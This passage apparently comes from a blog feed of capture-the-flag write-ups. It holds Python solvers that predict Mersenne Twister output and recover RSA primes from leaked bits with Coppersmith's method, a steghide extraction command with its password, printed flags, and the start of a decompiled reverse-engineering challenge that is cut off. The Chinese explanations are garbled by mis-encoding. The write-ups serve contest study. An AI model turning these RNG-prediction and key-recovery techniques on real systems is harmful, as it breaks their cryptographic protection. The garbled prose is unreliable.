mt[(i + <span class="hljs-number">397</span>) % <span class="hljs-number">624</span>]<br>        <span class="hljs-keyword">if</span> y % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>            mt[i] = mt[i] ^ <span class="hljs-number">0x9908b0df</span><br>    <span class="hljs-keyword">return</span> mt<br><br>res = [[<span class="hljs-built_in">int</span>(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> i.split()] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res.split(<span class="hljs-string">&#x27;\n&#x27;</span>)]<br>X = [i[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res]<br>out = <span class="hljs-built_in">sum</span>([[<span class="hljs-built_in">int</span>(<span class="hljs-built_in">hex</span>(x)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">256</span>)[i:i+<span class="hljs-number">8</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>, <span class="hljs-number">8</span>)][::-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> X], [])<br>out = out[:<span class="hljs-number">624</span>]<br>out = [crack_extract(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> out]<br><br>ans = <span class="hljs-built_in">list</span>()<br>out = crack_twist(out)<br>ans += out<br>out = crack_twist(out)<br>ans = out[-(<span class="hljs-number">640</span>-<span class="hljs-number">624</span>):] + ans<br><br>ans = [extract(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ans]<br>A = [<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(x)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ans[i:i+<span class="hljs-number">32</span>]][::-<span class="hljs-number">1</span>]), <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(ans), <span class="hljs-number">32</span>)]<br>A = [<span class="hljs-number">0</span>] + A<br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">x</span>):<br>    n = <span class="hljs-number">21</span><br>    res = <span class="hljs-number">0</span><br>    tmp = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        res = (res + tmp * A[i]) % p<br>        tmp = tmp * x % p<br>    <span class="hljs-keyword">return</span> res % p<br><br>secret = (res[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] - f(res[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>])) % p<br>Q = N // secret<br>d = inverse(<span class="hljs-number">0x10001</span>, N-secret-Q+<span class="hljs-number">1</span>)<br>m = long_to_bytes(<span class="hljs-built_in">pow</span>(c, d, N))<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><h2 id="colorful-matrix"><a href="#colorful-matrix" class="headerlink" title="colorful_matrix"></a>colorful_matrix</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">ns = [<span class="hljs-number">38630062416586710341458654419912504176237737247477839749085033080367529539859992076587411537805430366799412095876782912512744262957062106155418341531142309858429218208463637096843365217114990765965110566415965985105403996944993619708417839598461935470469097206342256014086162845948208599334925650727933097059538199199685364793545286980392966271769914201657672004082101110775504946586957241075964270454872257405872181588544468173017149763827540561921126826597515171761064800381983526515300315517818122598179574900255685121991744205071544970</span>, <span class="hljs-number">41522753602903133841910260331594875922287719226997542592715810409935551768308104573333760854332533376702631593490915962706512143045107096658851885513727202513616813054397657610854303071682604806070009002234312854968365250748142324994926715544722158698813288131533399544263105858513134170084625526223987620550110255872688155827773099232631041345207194483609514502522566888883736218471849075697433311580004701384847571029783514418685068903758509270527252444771313048094566344002411364378658592832008194309873599342916391769027015343562030852</span>, <span class="hljs-number">41542983120532762175372001624404625565366126179958909731196555044290633581761361918706298428954501507557598076910710787422049443564800530253137695341299743714514361560156305534490483794181933110893966453220306980682146624294992100948497284459992930850081254114996830645068636306625330524465991656430799359422407117440063911943625477783216502523414967017151717597372146324488526509879620785458016456593044828784565522423332830549325397893426472247197776412026158371655860380929692662547882654137064941217130915364306358205055760044763651406</span>, <span class="hljs-number">42853015443318352230776688785915441259875645365236808434164117288657978345098324019250085686482568413223085548506789311679316323466083886556772338612177680666217592255234589446979456714341877135596118517098603502394776049958587301113539552072352462301070489369653155854389890761241450743607560719433910573462283304103064437843063566946231984094581307498714742271881862348689297267558023093643893310002803310596286441071314219020032740336515363830250477649030557311461077069407775907176409762823453607196260454965048316567154365877848652918</span>, <span class="hljs-number">31152961872836435078296602982779340735140569916125711058616435902653202922218293684857125091648631460215120167354825278469413413558325850576700866199515219603448136082693185200558425103833947831228064760642508443585470729998592994719564254894176473779555436230174300038353978808432410463449170865897259181312953584408177790825688497584119467820716449210429423337019604137134889051973100340798405991782200038835066294194815913887924272593864934325496116821854183293510325217934617021428710898873475027666892706022106386340733691632884942848</span>]<br>A = [<span class="hljs-number">12789809461864875489953273982997537541385904671489556544122095227619591140533414669794423644619127980362623481580128258914287474542792728686579090501397390</span>, <span class="hljs-number">10463950513938701625808784986819665844287315724639315128677227520960105897990256530542006653611594269012930935073966767351788182657861624733138283749460454</span>, <span class="hljs-number">5253244650607533810967862436125419800679723144526973463211784033045021824966560017919956773745212139142517766154626849426827164032731516615725539069585525</span>, <span class="hljs-number">5644589184984504085855423002268477365020278981591337230721358313393863912025011466727192648804002734561676112555123877764178690726130713927642577324443238</span>, <span class="hljs-number">4231732567865883627242742552738439372803539125622706171540910152922080004603138662537022248675968288205781990968838888633816697065257733344028576518431020</span>, <span class="hljs-number">2483388920404524165854675814798022834892112957478917588986471421083048888193527751575039626887367465858751417977246719312923814782809309525841102293919541</span>, <span class="hljs-number">3252353812256192711411255830105475125944842449239880454539397067913664088094160819193268643401968970009466652179043139341471403913410402646923633696154454</span>, <span class="hljs-number">11575010486066232687430367040977113580882826853104996856464797182632266635060724100357205810604915010810884387573114266349621457564659060272935537811111850</span>, <span class="hljs-number">116107444921917032985259963199427176510900273385517435613848456370557161312731449337837406563733552524777525870560544042690403987311424820755256727586807</span>, <span class="hljs-number">5859050133610438843641532306693688255014116940390205022708310454673159702673207152462501010791971695002865650407033762568636006764435795015869726867643634</span>, <span class="hljs-number">5954075553161305677556950650395792531753502207483036473422070018485916621872566706504374038792527687442272405589975343003802956899043321092006127828986114</span>, <span class="hljs-number">4571747544457157571652286537158051402285727327066029382085461714597609990601683125994983291866807816649968826930652068427193317966970789937746419206862747</span>, <span class="hljs-number">7166507561570980603812241332170524724051295937096000768984168029904561160020043035660087151672164814332446644696618077835020463308343415953131944864257266</span>, <span class="hljs-number">4852042788460566411381271873349329096978244586097817622748766708426751073559942708861852208085367014057217116211249133109246735634468823924185525972777655</span>, <span class="hljs-number">11962941918999276757181090570698839032103646409734781047194175833198626142790676141060052011581957980660140931408560130449153056874213033784715711461403345</span>, <span class="hljs-number">10324508881746579337486319574059121005227580732153432145860775835052420139026016902518605634385512021513380467928195663920843022679549517463264144660593354</span>, <span class="hljs-number">13276257094435850052122403884510025189232513948002582716865201271569293297601525601586036713056700716929820641888489806178376555435219630186396004003438962</span>, <span class="hljs-number">6525051273399089095687950615197786094425890004112675057642687348101531212837185750558500720306108976630502328600886080197626115513445112562084719104488315</span>, <span class="hljs-number">12922888505610354933000354792496863801007995464403098763485264334670452387681468617068312646367483171083114539083453125614861357751571161533921864394641576</span>, <span class="hljs-number">9489726784141062031514945333087338495823600723655465328127755755022980083351477888038160719541864899912899592065620071698977397662002448273876711116012763</span>, <span class="hljs-number">10630316198843195148937849513165933809121991192035364160395429088101265852052098101114542104327663563661384303617672183366879116750889320604308038959012109</span>, <span class="hljs-number">12675564142993964272844760955973914547747654087592111324261755301551267959231076883765863344473167582531968290671984039948163579495803204811731286282708940</span>, <span class="hljs-number">11847724105274460405216443356582445218232627275228120716891711887600046501095390733716854871561352002320819466803698088448952127166615410820121973485089326</span>, <span class="hljs-number">5131676593756685549522564504727003861447389891839469018437277330988047271086971907217360711863971849879439418231726349935396008040776952541710218842744018</span>, <span class="hljs-number">8049060452950901277510497437779182190254362319091882684392717180429468875432078713802857488901441344429723298843967365750616860588029426099852763482179470</span>, <span class="hljs-number">2365060249260571713545479629411006471094806409182638354076861269679377537605360223984548798658469783472746989448405310909017645138161178501458084966625559</span>, <span class="hljs-number">7467521246204465304438401242342633361751371318557249418344587207503257890765643838557008735305668588521988487342275527781708126255070883848829062790678347</span>, <span class="hljs-number">5841608816993144092409175658260479687582056537041472535819914412630519543198558564258699185557903902095773598614097026740427138629173672250387442834578787</span>, <span class="hljs-number">3935779917509948624841228665498558015416911059417306651751360048412619176423173794541812556512582747588138532941031730797102738268660078594473168666677171</span>, <span class="hljs-number">1459083415233950534805962555425717865938763752937036513111696179351002303817986848490146888626704327653287774806488952733813718461674376764427084478395399</span>, <span class="hljs-number">6426876689549337938550615491086475536072547585103523407263007393570982327518298678278232288342601754164640081474537962710401178482959474762541185760732929</span>, <span class="hljs-number">5241364650650467046722868257809607948071188801137204831449976666385482519613365369974704486723941517654753205012497273820309153659423928739972270634209996</span>, <span class="hljs-number">6387483223002092292686097811446217867743566298067033295601210265979889577756648605354064672061975949925472022416479935990178719227937307079186916383092053</span>, <span class="hljs-number">170562164015232424518655058158727202269056868720093972639058422975773575660534168774299548952867348396798580779605954510297102765330549642318362861226163</span>, <span class="hljs-number">10004133230245713370426176448219282796530473722412487408402635996842671302539458739305597027107498342509248085998067976408732789438099488867425813748783724</span>, <span class="hljs-number">12325342879747412722323355648741345730921040452129462974449188258885453690169624888480720109964630270938743431623479816739889661554987977051169401841580388</span>, <span class="hljs-number">641543989928732942291347866597230552820621633110802944556141221591498546555080480758772801043509130524233886009444044150447511986129019395067102094826363</span>]<br>B = [<span class="hljs-number">108715652691370707411987210267535348806</span>, <span class="hljs-number">131676833696101475747102644851662113271</span>, <span class="hljs-number">122436706338521558335484593966234623745</span>, <span class="hljs-number">255864866572301552398412638474857375629</span>, <span class="hljs-number">81098761191414480003681301866161112100</span>, <span class="hljs-number">322322463176364397336266169283851913620</span>, <span class="hljs-number">198167679309202772183020662350938553923</span>, <span class="hljs-number">326360662842236388778385468938922853242</span>, <span class="hljs-number">241812832858991643670485138860832357660</span>, <span class="hljs-number">69768236619183466076110136290750715548</span>, <span class="hljs-number">32383134960394164339076842474280712870</span>, <span class="hljs-number">147747232748027508904245311745435517130</span>, <span class="hljs-number">25327826075608705748116808975774398964</span>, <span class="hljs-number">65295332681674581261444632606267440749</span>, <span class="hljs-number">236756211690281667988216748814564193312</span>, <span class="hljs-number">106435149910135092172124474857722935730</span>, <span class="hljs-number">270727089812520941022075406571244846193</span>, <span class="hljs-number">206881193220261276126028739930244917728</span>, <span class="hljs-number">131961838897694897398340205404861333362</span>, <span class="hljs-number">219211823942216355573832791993673934321</span>, <span class="hljs-number">150960424777134558142309786444952807101</span>, <span class="hljs-number">51112048255939343109218372373173385772</span>, <span class="hljs-number">182065623911902509203036774197184164110</span>, <span class="hljs-number">168420344895532090057957641972492853410</span>, <span class="hljs-number">301808673225362418769168353084541667053</span>, <span class="hljs-number">132272458662433671393247350648662880688</span>, <span class="hljs-number">495672626901999558635736361346563007</span>, <span class="hljs-number">182444159345379042372018248514964944782</span>, <span class="hljs-number">144584137563407779776361378564517880036</span>, <span class="hljs-number">338518705859818740467225748906995999694</span>, <span class="hljs-number">205885429741815676881969528495365151019</span>, <span class="hljs-number">233897982464483450790005953366237992668</span>, <span class="hljs-number">279307677123402840425362992920185630901</span>, <span class="hljs-number">133493426228159673166382443820069696429</span>, <span class="hljs-number">316624110847744871475435405969944304329</span>, <span class="hljs-number">187931604382397525131117897387179435812</span>, <span class="hljs-number">220019728924915067987393012581921164417</span>]<br>enc = <span class="hljs-string">b&#x27;cTmkMb\xfc\x05|\x1d\xc7\x13\xbaSe\xe0\xbd\xc0\xd9\xa3\x8cwo\x82yN[B&amp;\x80\xd7KPwQ`\x9c\xbf&lt;y\x8e\x8a\x97e\xa074\xb2&#x27;</span><br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> mt19937predictor <span class="hljs-keyword">import</span> MT19937Predictor<br><br>p = <span class="hljs-number">293423658885957174953198318664231534672400520068303593221989900395768107225130267646792968959460384248015583618158947268381852534151783869878808621629530642974652628810907251607210136313789978156955302211733219987661815438401343683</span><br>key1 = long_to_bytes(p)[:-<span class="hljs-number">64</span>]<br><br><br>predictor = MT19937Predictor()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ns:predictor.setrandbits(i % p, <span class="hljs-number">256</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> A:predictor.setrandbits(i, <span class="hljs-number">512</span>)<br><br>iv = long_to_bytes(predictor.getrandbits(<span class="hljs-number">128</span>))<br>aes = AES.new(key1,AES.MODE_CBC,iv)<br>flag = aes.decrypt(enc)<br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#flag&#123;86baa4ed-5ec7-11ee-ae14-ac1203ab14da&#125;</span><br></code></pre></td></tr></table></figure><h2 id="LeakyRSA"><a href="#LeakyRSA" class="headerlink" title="LeakyRSA"></a>LeakyRSA</h2><p>å…ˆæ±‚å‡ºpå’Œqçš„é«˜ä½ï¼Œä½ä½ç”¨copperï¼Œä¸­é—´ç”¨çˆ†ç ´ï¼Œepsilon=0.01</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python">N = <span class="hljs-number">73822410148110759760164946405270228269255384237831275745269402590230495569279769799226813942899942423718229747478982630879557319063920515141217164980012063064986634632452289290326704640527699568662492105204165609614169349755365956569362139057327962393611139347462018186440108621311077722819578905265976612923</span><br>gift = <span class="hljs-number">2223117424030234543005449667053988296724455736030907136592525175314696509716321</span><br>gift &lt;&lt;=<span class="hljs-number">250</span><br>PR.&lt;x&gt; = PolynomialRing(Zmod(N))<br>ok = <span class="hljs-literal">False</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pq_xor</span>(<span class="hljs-params">tp,tq,idx</span>):<br>    <span class="hljs-keyword">global</span> ok <br>    <br>    <span class="hljs-keyword">if</span> ok:<br>        <span class="hljs-keyword">return</span> <br>    <span class="hljs-keyword">if</span> tp*tq&gt;N:<br>        <span class="hljs-keyword">return</span> <br>    <span class="hljs-keyword">if</span> (tp+(<span class="hljs-number">2</span>&lt;&lt;idx))*(tq+(<span class="hljs-number">2</span>&lt;&lt;idx))&lt;N:<br>        <span class="hljs-keyword">return</span> <br>        <br>    <span class="hljs-keyword">if</span> idx&lt;=<span class="hljs-number">250</span>:<br>        <span class="hljs-keyword">try</span>:<br>            f = tp + x <br>            rr = f.monic().small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">250</span>, beta=<span class="hljs-number">0.45</span>,epsilon=<span class="hljs-number">0.01</span>)<br>            <span class="hljs-built_in">print</span>(rr)<br>            <span class="hljs-keyword">if</span> rr != []:<br>                <span class="hljs-built_in">print</span>(rr)<br>                <span class="hljs-built_in">print</span>(tp)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p = &#x27;</span>,f(rr[<span class="hljs-number">0</span>]))<br>                ok = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>        <br>        <span class="hljs-keyword">return</span><br>    <br>    idx -=<span class="hljs-number">1</span><br>    b = (gift &gt;&gt;idx)&amp;<span class="hljs-number">1</span><br>    one = <span class="hljs-number">1</span>&lt;&lt;idx <br>    <span class="hljs-keyword">if</span> b==<span class="hljs-number">0</span>:<br>        pq_xor(tp,tq,idx)    <br>        pq_xor(tp+one,tq+one,idx)    <br>    <span class="hljs-keyword">else</span>:   <span class="hljs-comment">#1</span><br>        pq_xor(tp+one,tq,idx)<br>        pq_xor(tp,tq+one,idx)<br><br>tp = <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">511</span><br>tq = <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">511</span><br>pq_xor(tp,tq,<span class="hljs-number">511</span>)<br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">6814449132912466352143200200256605077873329465758477832056090562012411200107156482645933890997787435093806046493913273252717701817613907418845774345791241</span><br>q = <span class="hljs-number">10833217580503000698385694268032196544400600307706228180481286239545614448110770843300361411809086269809006469621399256214887200838529724133384063799751203</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">71808322808599218331233291542779486534747913572475630198802984648982830332628443972652322590637382696027943799004331488098592525306523343649935216419522329722152742610560398216737030893090641493326477786720839849938277402743820773957184083430369443325368720115515840174745825798187125454448297155036065857691</span><br>n = p*q<br>phi = (q-<span class="hljs-number">1</span>)*(p-<span class="hljs-number">1</span>)<br>d = inverse(e, phi) <br><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br><span class="hljs-comment">#flag&#123;6eb67115-38b1-4e75-b3fc-de3a9697e565&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="æˆ‘çš„å£çº¸"><a href="#æˆ‘çš„å£çº¸" class="headerlink" title="æˆ‘çš„å£çº¸"></a>æˆ‘çš„å£çº¸</h2><p>foremoståˆ†å‡ºä¸‰ä¸ªæ–‡ä»¶<br>å¯¹flag.txtè§£snowéšå†™ keyåœ¨jpgæ–‡ä»¶å°¾ï¼›flag.wavè§£SSTVï¼›</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide extract -sf youshouldknowme.jpeg -p 7hR@1nB0$&amp;<br><br><span class="hljs-built_in">cat</span> flag.txt<br><br>flag&#123;b921323f-<br></code></pre></td></tr></table></figure><p><code>flag&#123;b921323f-eaa2-4d62-ace6-f86361842eb8&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>é¹åŸæ¯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023ç½‘ä¿¡æŸé¹­æ¯</title>
    <link href="/2023/10/11/2023%E7%BD%91%E4%BF%A1%E6%9F%8F%E9%B9%AD%E6%9D%AF/"/>
    <url>/2023/10/11/2023%E7%BD%91%E4%BF%A1%E6%9F%8F%E9%B9%AD%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="imm"><a href="#imm" class="headerlink" title="imm"></a>imm</h4><p>å…³é”®å‡½æ•°<code>sub_415190</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> __fastcall <span class="hljs-title function_">sub_415190</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s)</span><br>&#123;<br>    <span class="hljs-type">int</span> v1; <span class="hljs-comment">// ebp</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// esi</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// edi</span><br>    <span class="hljs-type">char</span> v5; <span class="hljs-comment">// al</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// ecx</span><br>    <span class="hljs-type">char</span> *v7; <span class="hljs-comment">// ecx</span><br>    <span class="hljs-type">char</span> *v8; <span class="hljs-comment">// edx</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v9; <span class="hljs-comment">// esi</span><br>    <span class="hljs-type">bool</span> v14; <span class="hljs-comment">// cf</span><br>    <span class="hljs-type">char</span> v16[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp-B0h] [ebp-BCh]</span><br>    <span class="hljs-type">char</span> v18[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp-84h] [ebp-90h] BYREF</span><br>    <span class="hljs-type">char</span> v19[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp-80h] [ebp-8Ch] BYREF</span><br>    <span class="hljs-type">int</span> v20; <span class="hljs-comment">// [esp-60h] [ebp-6Ch]</span><br>    <span class="hljs-type">int</span> v21; <span class="hljs-comment">// [esp-5Ch] [ebp-68h]</span><br>    <span class="hljs-type">int</span> v22; <span class="hljs-comment">// [esp-58h] [ebp-64h]</span><br>    <span class="hljs-type">int</span> v23; <span class="hljs-comment">// [esp-54h] [ebp-60h]</span><br>    <span class="hljs-type">int</span> v24; <span class="hljs-comment">// [esp-50h] [ebp-5Ch]</span><br>    <span class="hljs-type">int</span> v25; <span class="hljs-comment">// [esp-4Ch] [ebp-58h]</span><br>    <span class="hljs-type">int</span> v26; <span class="hljs-comment">// [esp-48h] [ebp-54h]</span><br>    <span class="hljs-type">int</span> v27; <span class="hljs-comment">// [esp-44h] [ebp-50h]</span><br>    <span class="hljs-type">char</span> v28[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp-40h] [ebp-4Ch]</span><br>    <span class="hljs-type">char</span> v29[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp-20h] [ebp-2Ch] BYREF</span><br>    _DWORD v30[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [esp+0h] [ebp-Ch] BYREF</span><br>    <span class="hljs-type">void</span> *retaddr; <span class="hljs-comment">// [esp+Ch] [ebp+0h]</span><br><br>    v30[<span class="hljs-number">0</span>] = v1;<br>    v30[<span class="hljs-number">1</span>] = retaddr;<br>    _EBP = v30;<br>    *(_OWORD *)v16 = <span class="hljs-number">0</span>i64;<br>    *(_OWORD *)&amp;v16[<span class="hljs-number">16</span>] = <span class="hljs-number">0</span>i64;<br>    *(_OWORD *)v29 = <span class="hljs-number">0</span>i64;<br>    *(_OWORD *)&amp;v29[<span class="hljs-number">16</span>] = <span class="hljs-number">0</span>i64;<br>    *(_DWORD *)v19 = <span class="hljs-number">-1</span>;<br>    *(_DWORD *)&amp;v19[<span class="hljs-number">4</span>] = <span class="hljs-number">-1</span>;<br>    *(_DWORD *)&amp;v19[<span class="hljs-number">8</span>] = <span class="hljs-number">-1</span>;<br>    *(_DWORD *)&amp;v19[<span class="hljs-number">12</span>] = <span class="hljs-number">-1</span>;<br>    *(_DWORD *)&amp;v19[<span class="hljs-number">16</span>] = <span class="hljs-number">-1</span>;<br>    *(_DWORD *)&amp;v19[<span class="hljs-number">20</span>] = <span class="hljs-number">-1</span>;<br>    *(_DWORD *)&amp;v19[<span class="hljs-number">24</span>] = <span class="hljs-number">-1</span>;<br>    *(_DWORD *)&amp;v19[<span class="hljs-number">28</span>] = <span class="hljs-number">-1</span>;<br>    v3 = <span class="hljs-built_in">strlen</span>(s);<br>    <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">0x40</span> )<br>    &#123;<br>        v4 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> ( *(_DWORD *)v18 = <span class="hljs-number">0</span>; v4 &lt; v3; v16[v6] = v5 )<br>        &#123;<br>            v18[<span class="hljs-number">0</span>] = s[v4];<br>            v18[<span class="hljs-number">1</span>] = s[v4 + <span class="hljs-number">1</span>];<br>            v5 = strtol(v18, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>);<br>            v6 = v4 &gt;&gt; <span class="hljs-number">1</span>;<br>            v4 += <span class="hljs-number">2</span>;<br>        &#125;<br>    &#125;<br>    *(_DWORD *)v28 = <span class="hljs-number">0x765EEBCD</span>;<br>    v7 = v29;<br>    *(_DWORD *)&amp;v28[<span class="hljs-number">4</span>] = <span class="hljs-number">0x31AF220F</span>;<br>    v8 = v19;<br>    *(_DWORD *)&amp;v28[<span class="hljs-number">8</span>] = <span class="hljs-number">0xEF3C9282</span>;<br>    v9 = <span class="hljs-number">28</span>;<br>    *(_DWORD *)&amp;v28[<span class="hljs-number">12</span>] = <span class="hljs-number">0x676C1B8</span>;<br>    *(_DWORD *)&amp;v28[<span class="hljs-number">16</span>] = <span class="hljs-number">0x7DB52F18</span>;<br>    *(_DWORD *)&amp;v28[<span class="hljs-number">20</span>] = <span class="hljs-number">0x85EA0A7F</span>;<br>    *(_DWORD *)&amp;v28[<span class="hljs-number">24</span>] = <span class="hljs-number">0xA3890092</span>;<br>    *(_DWORD *)&amp;v28[<span class="hljs-number">28</span>] = <span class="hljs-number">0x32E7E22C</span>;<br>    __asm<br>    &#123;<br>        vmovdqu ymm0, ymmword ptr [ebp<span class="hljs-number">-40</span>h]<br>            vpxor   ymm0, ymm0, ymmword ptr [ebp<span class="hljs-number">-0B</span>0h]<br>        &#125;<br>    v20 = <span class="hljs-number">0xE06070A</span>;<br>    v21 = <span 